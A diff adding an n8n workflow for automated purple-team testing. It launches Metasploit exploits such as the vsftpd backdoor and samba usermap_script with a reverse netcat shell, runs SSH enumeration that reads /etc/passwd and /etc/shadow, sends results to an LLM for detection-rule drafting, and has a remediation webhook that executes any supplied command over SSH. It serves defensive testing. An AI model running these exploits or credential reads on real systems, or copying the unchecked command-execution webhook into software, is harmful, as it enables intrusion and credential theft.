@@ -1,0 +1,681 @@
+{
+  "name": "Purple Team Operations - Main Workflow",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "pentest",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "webhook-pentest",
+      "name": "Webhook - Pentest Trigger",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [220, 300],
+      "webhookId": "pentest-trigger"
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "options": {
+            "caseSensitive": true,
+            "leftValue": "",
+            "typeValidation": "strict"
+          },
+          "conditions": [
+            {
+              "id": "condition-attack-type",
+              "leftValue": "={{ $json.attack_type }}",
+              "rightValue": "blackbox",
+              "operator": {
+                "type": "string",
+                "operation": "equals"
+              }
+            }
+          ],
+          "combinator": "and"
+        },
+        "options": {}
+      },
+      "id": "switch-attack-type",
+      "name": "Switch - Attack Type",
+      "type": "n8n-nodes-base.if",
+      "typeVersion": 2,
+      "position": [440, 300]
+    },
+    {
+      "parameters": {
+        "command": "={{ \n// Build Metasploit resource script for blackbox attack\nconst target_ip = $json.target.ip;\nconst target_port = $json.target.port;\nconst lhost = $json.attack_config.lhost;\nconst lport = $json.attack_config.lport;\nconst module = $json.attack_config.module;\n\n// Map module to Metasploit module path\nconst moduleMap = {\n  'samba_usermap': 'exploit/multi/samba/usermap_script',\n  'vsftpd_234': 'exploit/unix/ftp/vsftpd_234_backdoor',\n  'distcc': 'exploit/unix/misc/distcc_exec',\n  'postgres_payload': 'exploit/linux/postgres/postgres_payload',\n  'java_rmi': 'exploit/multi/misc/java_rmi_server',\n  'tomcat_mgr': 'exploit/multi/http/tomcat_mgr_upload'\n};\n\nconst msfModule = moduleMap[module] || 'exploit/multi/samba/usermap_script';\n\n// Create resource script\nconst rcScript = `\nuse ${msfModule}\nset RHOSTS ${target_ip}\nset RHOST ${target_ip}\nset RPORT ${target_port}\nset LHOST ${lhost}\nset LPORT ${lport}\nset PAYLOAD cmd/unix/reverse_netcat\nexploit -j -z\nsleep 20\nsessions -l\nsessions -K\nexit -y\n`;\n\n// Save and execute\n`echo '${rcScript}' > /tmp/exploit_${{ $json.execution_id }}.rc && msfconsole -r /tmp/exploit_${{ $json.execution_id }}.rc 2>&1`\n}}"
+      },
+      "id": "ssh-blackbox-attack",
+      "name": "SSH - Execute Blackbox Attack",
+      "type": "n8n-nodes-base.ssh",
+      "typeVersion": 1,
+      "position": [680, 200],
+      "credentials": {
+        "sshPassword": {
+          "id": "YOUR_SSH_CREDENTIAL_ID",
+          "name": "Metasploit Server SSH"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "command": "={{ $json.custom_command || `\n# Credentialed attack - run enumeration\necho '=== SYSTEM INFO ==='\nuname -a\necho '=== CURRENT USER ==='\nwhoami\nid\necho '=== NETWORK INFO ==='\nifconfig || ip addr\necho '=== RUNNING PROCESSES ==='\nps aux | head -20\necho '=== OPEN PORTS ==='\nnetstat -tlnp || ss -tlnp\necho '=== PASSWD FILE ==='\ncat /etc/passwd\necho '=== SHADOW (if accessible) ==='\ncat /etc/shadow 2>/dev/null || echo 'No access to shadow file'\necho '=== CRON JOBS ==='\nls -la /etc/cron* 2>/dev/null\ncrontab -l 2>/dev/null\necho '=== SUDO PERMISSIONS ==='\nsudo -l 2>/dev/null || echo 'No sudo access'\necho '=== SUID FILES ==='\nfind / -perm -u=s -type f 2>/dev/null | head -20\n` }}"
+      },
+      "id": "ssh-credentialed-attack",
+      "name": "SSH - Execute Credentialed Attack",
+      "type": "n8n-nodes-base.ssh",
+      "typeVersion": 1,
+      "position": [680, 400],
+      "credentials": {
+        "sshPassword": {
+          "id": "YOUR_SSH_CREDENTIAL_ID",
+          "name": "Target Server SSH"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "content": "={{ \n// Format attack result for Discord\nconst executionId = $('Webhook - Pentest Trigger').item.json.execution_id;\nconst attackType = $('Webhook - Pentest Trigger').item.json.attack_type;\nconst targetIp = $('Webhook - Pentest Trigger').item.json.target.ip;\nconst targetPort = $('Webhook - Pentest Trigger').item.json.target.port;\nconst output = $json.stdout || $json.stderr || 'No output captured';\nconst timestamp = new Date().toISOString();\n\n`**🎯 PURPLE TEAM ATTACK RESULT**\n\n**Execution ID:** \\`${executionId}\\`\n**Attack Type:** ${attackType.toUpperCase()}\n**Target:** ${targetIp}:${targetPort}\n**Timestamp:** ${timestamp}\n\n**📋 Raw Output:**\n\\`\\`\\`\n${output.substring(0, 1800)}${output.length > 1800 ? '\\n... (truncated)' : ''}\n\\`\\`\\`\n\n**📊 Status:** ${output.includes('session') && output.includes('opened') ? '✅ SESSION ESTABLISHED' : '⚠️ CHECK OUTPUT'}`\n}}",
+        "options": {}
+      },
+      "id": "discord-send-result",
+      "name": "Discord - Send Attack Result",
+      "type": "n8n-nodes-base.discord",
+      "typeVersion": 2,
+      "position": [920, 300],
+      "credentials": {
+        "discordBotApi": {
+          "id": "YOUR_DISCORD_CREDENTIAL_ID",
+          "name": "Purple Team Bot"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "={{ $env.PLATFORM_URL }}/api/webhook/notification",
+        "sendBody": true,
+        "specifyBody": "json",
+        "jsonBody": "={\n  \"type\": \"attack_completed\",\n  \"title\": \"Attack Execution Completed\",\n  \"message\": \"{{ $('Webhook - Pentest Trigger').item.json.attack_type }} attack on {{ $('Webhook - Pentest Trigger').item.json.target.ip }} completed\",\n  \"execution_id\": \"{{ $('Webhook - Pentest Trigger').item.json.execution_id }}\",\n  \"timestamp\": \"{{ $now.toISO() }}\"\n}",
+        "options": {}
+      },
+      "id": "http-notify-platform",
+      "name": "HTTP - Notify Platform",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [1140, 300]
+    },
+    {
+      "parameters": {
+        "jsCode": "// Parse and structure the attack result for AI analysis\nconst items = $input.all();\nconst webhookData = $('Webhook - Pentest Trigger').item.json;\nconst sshOutput = items[0].json.stdout || items[0].json.stderr || '';\n\n// Extract key information from output\nconst parseMetasploitOutput = (output) => {\n  const result = {\n    sessions_created: [],\n    commands_executed: [],\n    credentials_found: [],\n    system_info: {},\n    vulnerabilities: [],\n    network_connections: []\n  };\n  \n  // Extract session information\n  const sessionMatch = output.match(/session (\\d+) opened \\(([^)]+)\\)/gi);\n  if (sessionMatch) {\n    result.sessions_created = sessionMatch.map(s => {\n      const match = s.match(/session (\\d+) opened \\(([^)]+)\\)/);\n      return { id: match[1], connection: match[2] };\n    });\n  }\n  \n  // Extract system info\n  const unameMatch = output.match(/Linux\\s+\\S+\\s+([\\d.-]+)/i);\n  if (unameMatch) {\n    result.system_info.kernel = unameMatch[1];\n  }\n  \n  // Check for successful exploitation indicators\n  if (output.includes('Meterpreter') || output.includes('Command shell')) {\n    result.vulnerabilities.push('Remote Code Execution achieved');\n  }\n  \n  return result;\n};\n\nconst parsedData = parseMetasploitOutput(sshOutput);\n\n// Structure for AI analysis\nconst analysisInput = {\n  execution_id: webhookData.execution_id,\n  attack_type: webhookData.attack_type,\n  endpoint: {\n    hostname: webhookData.target.ip,\n    operating_system: parsedData.system_info.kernel || 'Unknown Linux',\n    role: 'server'\n  },\n  exact_commands_executed: parsedData.commands_executed,\n  raw_stdout_stderr: sshOutput,\n  parsed_behavioral_events: {\n    sessions: parsedData.sessions_created,\n    network: parsedData.network_connections,\n    credentials: parsedData.credentials_found\n  },\n  timestamp: new Date().toISOString(),\n  success: parsedData.sessions_created.length > 0 || sshOutput.includes('session')\n};\n\nreturn [{ json: analysisInput }];"
+      },
+      "id": "code-parse-attack-result",
+      "name": "Code - Parse Attack Result",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [1360, 300]
+    },
+    {
+      "parameters": {
+        "promptType": "define",
+        "text": "={{ $json }}",
+        "hasOutputParser": true,
+        "options": {
+          "systemMessage": "You are an enterprise-grade Purple Team AI Agent operating as a combination of Senior Penetration Tester, Detection Engineer, SOC Tier 3 Analyst, Incident Responder, and Threat Intelligence Analyst.\n\nYour mission is to deeply analyze the attack execution data provided, reconstruct exactly what happened on the endpoint, assess the security impact, propose safe remediation, and engineer high-fidelity detection rules.\n\nAnalyze the provided attack data and return a JSON response with the following structure:\n\n{\n  \"execution_id\": \"\",\n  \"attack_summary\": {\n    \"overview\": \"Detailed description of what happened\",\n    \"attacker_objective\": \"What the attacker aimed to achieve\",\n    \"skill_level\": \"Low/Medium/High/Advanced\",\n    \"confidence\": 0-100\n  },\n  \"attack_timeline\": [\n    {\n      \"timestamp\": \"ISO timestamp\",\n      \"command\": \"Command executed\",\n      \"action\": \"What action occurred\",\n      \"intent\": \"Why the attacker executed it\",\n      \"mitre\": [\"Txxxx\"],\n      \"risk\": \"low/medium/high/critical\"\n    }\n  ],\n  \"impact_assessment\": {\n    \"blast_radius\": \"Scope of impact\",\n    \"assets_affected\": [\"list of affected assets\"],\n    \"business_risk\": \"Business impact description\",\n    \"worst_case_scenario\": \"If undetected worst case\"\n  },\n  \"remediation\": {\n    \"immediate\": [\n      {\n        \"id\": \"unique_id\",\n        \"title\": \"Step title\",\n        \"description\": \"What this step does\",\n        \"command\": \"Exact command to run\",\n        \"target_scope\": \"Where to run this\",\n        \"expected_outcome\": \"What should happen\",\n        \"risk_if_skipped\": \"Risk if not done\",\n        \"requires_approval\": true/false,\n        \"is_disruptive\": true/false,\n        \"status\": \"pending\"\n      }\n    ],\n    \"short_term\": [...],\n    \"long_term\": [...]\n  },\n  \"detection_rules\": [\n    {\n      \"id\": \"unique_id\",\n      \"rule_name\": \"Descriptive name\",\n      \"description\": \"What this rule detects\",\n      \"index\": \"logs-*, filebeat-*\",\n      \"query\": \"KQL or EQL query\",\n      \"severity\": \"low/medium/high/critical\",\n      \"mitre\": [\"Txxxx\"],\n      \"false_positives\": \"Expected false positives\",\n      \"tuning_notes\": \"How to tune this rule\",\n      \"status\": \"draft\"\n    }\n  ],\n  \"threat_intelligence\": {\n    \"summary\": \"TI summary\",\n    \"ioc_correlation\": [],\n    \"confidence\": 0-100\n  },\n  \"assumptions_and_gaps\": [\"List of assumptions made\"],\n  \"overall_confidence\": 0-100\n}\n\nBe deterministic, explicit, and audit-ready. Do not hallucinate. Base analysis only on provided data."
+        }
+      },
+      "id": "ai-agent-analysis",
+      "name": "AI Agent - Security Analysis",
+      "type": "@n8n/n8n-nodes-langchain.chainLlm",
+      "typeVersion": 1.4,
+      "position": [1580, 300]
+    },
+    {
+      "parameters": {
+        "jsCode": "// Parse and validate AI response\nconst items = $input.all();\nlet aiResponse = items[0].json;\n\n// If response is a string, try to parse it as JSON\nif (typeof aiResponse === 'string') {\n  try {\n    aiResponse = JSON.parse(aiResponse);\n  } catch (e) {\n    // Try to extract JSON from markdown code blocks\n    const jsonMatch = aiResponse.match(/```json\\n([\\s\\S]*?)\\n```/);\n    if (jsonMatch) {\n      aiResponse = JSON.parse(jsonMatch[1]);\n    }\n  }\n}\n\n// Ensure all required fields exist\nconst validatedResponse = {\n  execution_id: aiResponse.execution_id || $('Code - Parse Attack Result').item.json.execution_id,\n  attack_summary: aiResponse.attack_summary || {\n    overview: 'Analysis pending',\n    attacker_objective: 'Unknown',\n    skill_level: 'Unknown',\n    confidence: 0\n  },\n  attack_timeline: aiResponse.attack_timeline || [],\n  impact_assessment: aiResponse.impact_assessment || {\n    blast_radius: 'Unknown',\n    assets_affected: [],\n    business_risk: 'Unknown',\n    worst_case_scenario: 'Unknown'\n  },\n  remediation: {\n    immediate: (aiResponse.remediation?.immediate || []).map((step, i) => ({\n      ...step,\n      id: step.id || `immediate_${i}`,\n      status: 'pending'\n    })),\n    short_term: (aiResponse.remediation?.short_term || []).map((step, i) => ({\n      ...step,\n      id: step.id || `short_${i}`,\n      status: 'pending'\n    })),\n    long_term: (aiResponse.remediation?.long_term || []).map((step, i) => ({\n      ...step,\n      id: step.id || `long_${i}`,\n      status: 'pending'\n    }))\n  },\n  detection_rules: (aiResponse.detection_rules || []).map((rule, i) => ({\n    ...rule,\n    id: rule.id || `rule_${i}`,\n    status: 'draft'\n  })),\n  threat_intelligence: aiResponse.threat_intelligence || {\n    summary: 'No threat intelligence data available',\n    ioc_correlation: [],\n    confidence: 0\n  },\n  assumptions_and_gaps: aiResponse.assumptions_and_gaps || [],\n  overall_confidence: aiResponse.overall_confidence || 50\n};\n\nreturn [{ json: validatedResponse }];"
+      },
+      "id": "code-validate-ai-response",
+      "name": "Code - Validate AI Response",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [1800, 300]
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "={{ $env.PLATFORM_URL }}/api/webhook/ai-analysis",
+        "sendBody": true,
+        "specifyBody": "json",
+        "jsonBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "http-send-analysis-to-platform",
+      "name": "HTTP - Send Analysis to Platform",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [2020, 300]
+    },
+    {
+      "parameters": {
+        "content": "={{ \nconst analysis = $json;\n\n`**🤖 AI SECURITY ANALYSIS COMPLETE**\n\n**Execution ID:** \\`${analysis.execution_id}\\`\n**Overall Confidence:** ${analysis.overall_confidence}%\n\n**📊 Attack Summary:**\n${analysis.attack_summary.overview.substring(0, 500)}\n\n**🎯 Attacker Objective:** ${analysis.attack_summary.attacker_objective}\n**⚔️ Skill Level:** ${analysis.attack_summary.skill_level}\n\n**💥 Impact Assessment:**\n- Blast Radius: ${analysis.impact_assessment.blast_radius}\n- Business Risk: ${analysis.impact_assessment.business_risk}\n\n**🔧 Remediation Steps:**\n- Immediate: ${analysis.remediation.immediate.length} steps\n- Short-term: ${analysis.remediation.short_term.length} steps\n- Long-term: ${analysis.remediation.long_term.length} steps\n\n**🛡️ Detection Rules Generated:** ${analysis.detection_rules.length}\n\n_View full analysis in Purple Team Platform_`\n}}",
+        "options": {}
+      },
+      "id": "discord-send-analysis",
+      "name": "Discord - Send Analysis Summary",
+      "type": "n8n-nodes-base.discord",
+      "typeVersion": 2,
+      "position": [2240, 300],
+      "credentials": {
+        "discordBotApi": {
+          "id": "YOUR_DISCORD_CREDENTIAL_ID",
+          "name": "Purple Team Bot"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={\n  \"success\": true,\n  \"execution_id\": \"{{ $('Webhook - Pentest Trigger').item.json.execution_id }}\",\n  \"message\": \"Attack execution initiated\",\n  \"timestamp\": \"{{ $now.toISO() }}\"\n}",
+        "options": {}
+      },
+      "id": "respond-webhook",
+      "name": "Respond to Webhook",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [2460, 300]
+    },
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "remediation",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "webhook-remediation",
+      "name": "Webhook - Remediation Trigger",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [220, 600],
+      "webhookId": "remediation-trigger"
+    },
+    {
+      "parameters": {
+        "command": "={{ $json.command }}"
+      },
+      "id": "ssh-execute-remediation",
+      "name": "SSH - Execute Remediation",
+      "type": "n8n-nodes-base.ssh",
+      "typeVersion": 1,
+      "position": [440, 600],
+      "credentials": {
+        "sshPassword": {
+          "id": "YOUR_SSH_CREDENTIAL_ID",
+          "name": "Target Server SSH"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "={{ $env.PLATFORM_URL }}/api/webhook/notification",
+        "sendBody": true,
+        "specifyBody": "json",
+        "jsonBody": "={\n  \"type\": \"remediation_executed\",\n  \"title\": \"Remediation Step Executed\",\n  \"message\": \"Step {{ $('Webhook - Remediation Trigger').item.json.step_id }} completed\",\n  \"execution_id\": \"{{ $('Webhook - Remediation Trigger').item.json.execution_id }}\",\n  \"data\": {\n    \"step_id\": \"{{ $('Webhook - Remediation Trigger').item.json.step_id }}\",\n    \"output\": \"{{ $json.stdout || $json.stderr }}\"\n  },\n  \"timestamp\": \"{{ $now.toISO() }}\"\n}",
+        "options": {}
+      },
+      "id": "http-notify-remediation",
+      "name": "HTTP - Notify Remediation Complete",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [660, 600]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={\n  \"success\": true,\n  \"step_id\": \"{{ $('Webhook - Remediation Trigger').item.json.step_id }}\",\n  \"output\": \"{{ $('SSH - Execute Remediation').item.json.stdout || $('SSH - Execute Remediation').item.json.stderr }}\"\n}",
+        "options": {}
+      },
+      "id": "respond-remediation",
+      "name": "Respond - Remediation",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [880, 600]
+    },
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "elastic-rule",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "webhook-elastic-rule",
+      "name": "Webhook - Elastic Rule Trigger",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [220, 800],
+      "webhookId": "elastic-rule-trigger"
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "={{ $json.elastic_url }}/_security/api/detection_engine/rules",
+        "authentication": "predefinedCredentialType",
+        "nodeCredentialType": "elasticsearchApi",
+        "sendBody": true,
+        "specifyBody": "json",
+        "jsonBody": "={{ JSON.stringify($json.elastic_rule) }}",
+        "options": {
+          "response": {
+            "response": {
+              "fullResponse": true
+            }
+          }
+        }
+      },
+      "id": "http-upload-elastic-rule",
+      "name": "HTTP - Upload Rule to Elastic",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [440, 800],
+      "credentials": {
+        "elasticsearchApi": {
+          "id": "YOUR_ELASTIC_CREDENTIAL_ID",
+          "name": "Elastic SIEM"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "={{ $env.PLATFORM_URL }}/api/webhook/notification",
+        "sendBody": true,
+        "specifyBody": "json",
+        "jsonBody": "={\n  \"type\": \"rule_applied\",\n  \"title\": \"Detection Rule Applied\",\n  \"message\": \"Rule uploaded to Elastic SIEM\",\n  \"execution_id\": \"{{ $('Webhook - Elastic Rule Trigger').item.json.execution_id }}\",\n  \"data\": {\n    \"rule_id\": \"{{ $('Webhook - Elastic Rule Trigger').item.json.rule_id }}\",\n    \"elastic_response\": \"{{ JSON.stringify($json) }}\"\n  },\n  \"timestamp\": \"{{ $now.toISO() }}\"\n}",
+        "options": {}
+      },
+      "id": "http-notify-rule-applied",
+      "name": "HTTP - Notify Rule Applied",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [660, 800]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={\n  \"success\": true,\n  \"rule_id\": \"{{ $('Webhook - Elastic Rule Trigger').item.json.rule_id }}\",\n  \"elastic_rule_id\": \"{{ $('HTTP - Upload Rule to Elastic').item.json.body?.id || 'unknown' }}\"\n}",
+        "options": {}
+      },
+      "id": "respond-elastic-rule",
+      "name": "Respond - Elastic Rule",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [880, 800]
+    },
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "threat-intel",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "webhook-threat-intel",
+      "name": "Webhook - Threat Intel Trigger",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [220, 1000],
+      "webhookId": "threat-intel-trigger"
+    },
+    {
+      "parameters": {
+        "jsCode": "// Fetch threat intelligence from configured sources\nconst input = $input.all()[0].json;\nconst mitreTechniques = input.mitre_techniques || [];\n\n// Simulate TI enrichment (in production, make actual API calls)\nconst enrichment = {\n  mitre_details: mitreTechniques.map(t => ({\n    technique_id: t,\n    name: getMitreName(t),\n    tactic: getMitreTactic(t),\n    description: getMitreDescription(t)\n  })),\n  related_campaigns: [],\n  iocs: [],\n  recommendations: []\n};\n\nfunction getMitreName(id) {\n  const map = {\n    'T1190': 'Exploit Public-Facing Application',\n    'T1059': 'Command and Scripting Interpreter',\n    'T1059.004': 'Unix Shell',\n    'T1021.004': 'SSH',\n    'T1078': 'Valid Accounts',\n    'T1098': 'Account Manipulation',\n    'T1136': 'Create Account',\n    'T1105': 'Ingress Tool Transfer'\n  };\n  return map[id] || id;\n}\n\nfunction getMitreTactic(id) {\n  const map = {\n    'T1190': 'Initial Access',\n    'T1059': 'Execution',\n    'T1059.004': 'Execution',\n    'T1021.004': 'Lateral Movement',\n    'T1078': 'Defense Evasion, Persistence, Privilege Escalation, Initial Access',\n    'T1098': 'Persistence',\n    'T1136': 'Persistence',\n    'T1105': 'Command and Control'\n  };\n  return map[id] || 'Unknown';\n}\n\nfunction getMitreDescription(id) {\n  const map = {\n    'T1190': 'Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network.',\n    'T1059': 'Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.',\n    'T1059.004': 'Adversaries may abuse Unix shell commands and scripts for execution.',\n    'T1021.004': 'Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH).',\n    'T1078': 'Adversaries may obtain and abuse credentials of existing accounts as a means of gaining access.',\n    'T1098': 'Adversaries may manipulate accounts to maintain access to victim systems.',\n    'T1136': 'Adversaries may create an account to maintain access to victim systems.',\n    'T1105': 'Adversaries may transfer tools or other files from an external system into a compromised environment.'\n  };\n  return map[id] || 'No description available';\n}\n\n// Format enrichment as text for rule description\nconst enrichmentText = `\n**MITRE ATT&CK Mapping:**\n${enrichment.mitre_details.map(m => `- ${m.technique_id} (${m.name}): ${m.tactic}`).join('\\n')}\n\n**Technique Details:**\n${enrichment.mitre_details.map(m => `${m.technique_id}: ${m.description}`).join('\\n\\n')}\n\n**Threat Intelligence Context:**\nThis detection rule targets behaviors associated with the above MITRE ATT&CK techniques.\nThese techniques are commonly used in exploitation campaigns targeting vulnerable services.\n`;\n\nreturn [{ \n  json: {\n    ...input,\n    enrichment: enrichmentText,\n    enrichment_data: enrichment\n  }\n}];"
+      },
+      "id": "code-threat-intel-enrichment",
+      "name": "Code - Threat Intel Enrichment",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [440, 1000]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={\n  \"success\": true,\n  \"rule_id\": \"{{ $('Webhook - Threat Intel Trigger').item.json.rule_id }}\",\n  \"enrichment\": \"{{ $json.enrichment }}\"\n}",
+        "options": {}
+      },
+      "id": "respond-threat-intel",
+      "name": "Respond - Threat Intel",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [660, 1000]
+    },
+    {
+      "parameters": {
+        "httpMethod": "GET",
+        "path": "fetch-alerts",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "webhook-fetch-alerts",
+      "name": "Webhook - Fetch Alerts Trigger",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [220, 1200],
+      "webhookId": "fetch-alerts-trigger"
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "={{ $env.ELASTIC_URL }}/_security/api/detection_engine/signals/search",
+        "authentication": "predefinedCredentialType",
+        "nodeCredentialType": "elasticsearchApi",
+        "sendBody": true,
+        "specifyBody": "json",
+        "jsonBody": "{\n  \"query\": {\n    \"bool\": {\n      \"filter\": [\n        {\n          \"range\": {\n            \"@timestamp\": {\n              \"gte\": \"now-24h\"\n            }\n          }\n        }\n      ]\n    }\n  },\n  \"size\": 100,\n  \"sort\": [\n    {\n      \"@timestamp\": {\n        \"order\": \"desc\"\n      }\n    }\n  ]\n}",
+        "options": {}
+      },
+      "id": "http-fetch-elastic-alerts",
+      "name": "HTTP - Fetch Elastic Alerts",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [440, 1200],
+      "credentials": {
+        "elasticsearchApi": {
+          "id": "YOUR_ELASTIC_CREDENTIAL_ID",
+          "name": "Elastic SIEM"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "jsCode": "// Parse and format Elastic alerts for the platform\nconst response = $input.all()[0].json;\nconst hits = response.hits?.hits || [];\n\nconst alerts = hits.map(hit => {\n  const source = hit._source || {};\n  return {\n    id: hit._id,\n    rule_id: source.signal?.rule?.id || 'unknown',\n    rule_name: source.signal?.rule?.name || 'Unknown Rule',\n    severity: source.signal?.rule?.severity || 'medium',\n    timestamp: source['@timestamp'] || new Date().toISOString(),\n    host: source.host?.name || source.host?.ip || 'unknown',\n    description: source.signal?.rule?.description || 'No description',\n    mitre_tactic: source.signal?.rule?.threat?.[0]?.tactic?.name,\n    mitre_technique: source.signal?.rule?.threat?.[0]?.technique?.[0]?.id,\n    count: 1\n  };\n});\n\n// Aggregate by rule_name\nconst aggregated = {};\nalerts.forEach(alert => {\n  if (aggregated[alert.rule_name]) {\n    aggregated[alert.rule_name].count++;\n  } else {\n    aggregated[alert.rule_name] = alert;\n  }\n});\n\nreturn [{ json: { alerts: Object.values(aggregated) } }];"
+      },
+      "id": "code-parse-alerts",
+      "name": "Code - Parse Alerts",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [660, 1200]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "respond-fetch-alerts",
+      "name": "Respond - Fetch Alerts",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [880, 1200]
+    }
+  ],
+  "connections": {
+    "Webhook - Pentest Trigger": {
+      "main": [
+        [
+          {
+            "node": "Switch - Attack Type",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Switch - Attack Type": {
+      "main": [
+        [
+          {
+            "node": "SSH - Execute Blackbox Attack",
+            "type": "main",
+            "index": 0
+          }
+        ],
+        [
+          {
+            "node": "SSH - Execute Credentialed Attack",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "SSH - Execute Blackbox Attack": {
+      "main": [
+        [
+          {
+            "node": "Discord - Send Attack Result",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "SSH - Execute Credentialed Attack": {
+      "main": [
+        [
+          {
+            "node": "Discord - Send Attack Result",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Discord - Send Attack Result": {
+      "main": [
+        [
+          {
+            "node": "HTTP - Notify Platform",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "HTTP - Notify Platform": {
+      "main": [
+        [
+          {
+            "node": "Code - Parse Attack Result",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Code - Parse Attack Result": {
+      "main": [
+        [
+          {
+            "node": "AI Agent - Security Analysis",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "AI Agent - Security Analysis": {
+      "main": [
+        [
+          {
+            "node": "Code - Validate AI Response",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Code - Validate AI Response": {
+      "main": [
+        [
+          {
+            "node": "HTTP - Send Analysis to Platform",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "HTTP - Send Analysis to Platform": {
+      "main": [
+        [
+          {
+            "node": "Discord - Send Analysis Summary",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Discord - Send Analysis Summary": {
+      "main": [
+        [
+          {
+            "node": "Respond to Webhook",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Webhook - Remediation Trigger": {
+      "main": [
+        [
+          {
+            "node": "SSH - Execute Remediation",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "SSH - Execute Remediation": {
+      "main": [
+        [
+          {
+            "node": "HTTP - Notify Remediation Complete",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "HTTP - Notify Remediation Complete": {
+      "main": [
+        [
+          {
+            "node": "Respond - Remediation",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Webhook - Elastic Rule Trigger": {
+      "main": [
+        [
+          {
+            "node": "HTTP - Upload Rule to Elastic",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "HTTP - Upload Rule to Elastic": {
+      "main": [
+        [
+          {
+            "node": "HTTP - Notify Rule Applied",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "HTTP - Notify Rule Applied": {
+      "main": [
+        [
+          {
+            "node": "Respond - Elastic Rule",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Webhook - Threat Intel Trigger": {
+      "main": [
+        [
+          {
+            "node": "Code - Threat Intel Enrichment",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Code - Threat Intel Enrichment": {
+      "main": [
+        [
+          {
+            "node": "Respond - Threat Intel",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Webhook - Fetch Alerts Trigger": {
+      "main": [
+        [
+          {
+            "node": "HTTP - Fetch Elastic Alerts",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "HTTP - Fetch Elastic Alerts": {
+      "main": [
+        [
+          {
+            "node": "Code - Parse Alerts",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Code - Parse Alerts": {
+      "main": [
+        [
+          {
+            "node": "Respond - Fetch Alerts",
+            "type": "main",
